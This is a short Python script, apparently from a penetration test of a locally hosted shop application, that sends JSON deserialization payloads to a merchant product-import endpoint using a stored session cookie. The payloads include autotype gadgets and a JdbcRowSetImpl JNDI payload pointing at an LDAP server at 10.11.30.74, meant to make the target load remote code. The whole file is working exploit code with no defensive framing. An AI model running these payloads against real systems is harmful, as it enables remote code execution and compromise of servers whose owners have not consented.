import urllib.request, json, os
work = r'D:\Backup\Downloads\awa-ddd\work\local-8081-20261106'
cookie = json.load(open(os.path.join(work, 'sessions', 'awa_shop1106a.json'), encoding='utf-8'))['Cookie']
url = 'http://127.0.0.1:8081/api/merchant/products/import-json'
payloads = [
    '{"@type":"java.lang.Runtime"}',
    '{"@type":"java.util.Date","time":0}',
    '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://10.11.30.74:1389/awa","autoCommit":true}',
    '{"products":[{"@type":"java.lang.Runtime"}]}',
]
for p in payloads:
    req = urllib.request.Request(url, data=p.encode('utf-8'), headers={'Content-Type': 'application/json', 'Cookie': cookie}, method='POST')
    try:
        r = urllib.request.urlopen(req)
        print('PAYLOAD', p[:80], '->', r.status, r.read().decode()[:300])
    except urllib.error.HTTPError as e:
        print('PAYLOAD', p[:80], '-> HTTP', e.code, e.read().decode()[:300])
    except Exception as e:
        print('PAYLOAD', p[:80], '-> ERR', type(e).__name__, str(e)[:200])
